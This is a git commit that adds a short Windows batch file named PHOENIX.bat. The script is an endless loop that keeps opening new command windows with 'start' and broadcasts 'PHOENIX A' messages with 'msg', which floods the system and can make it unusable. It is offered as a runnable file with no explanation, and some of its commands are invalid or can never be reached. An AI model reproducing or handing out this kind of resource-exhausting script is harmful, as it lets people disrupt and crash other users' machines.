b3ad6cf2d35f8ed5e78dca4c3ec402781e5186c0
Yaroslav22k <yaroslav234k@gmail.com>
2025-04-12 14:52:47 +0300

    Add files via upload

---
+++ PHOENIX.bat
@@ -0,0 +1,17 @@
+@echo off
+color FF0000
+:x
+start
+start
+start
+chcp 02
+msg * PHOENIX A
+goto x
+chcp 02
+msg * PHOENIX A
+chcp 02
+msg * PHOENIX A
+chcp 02
+msg * PHOENIX A
+chcp 02
+msg * PHOENIX A
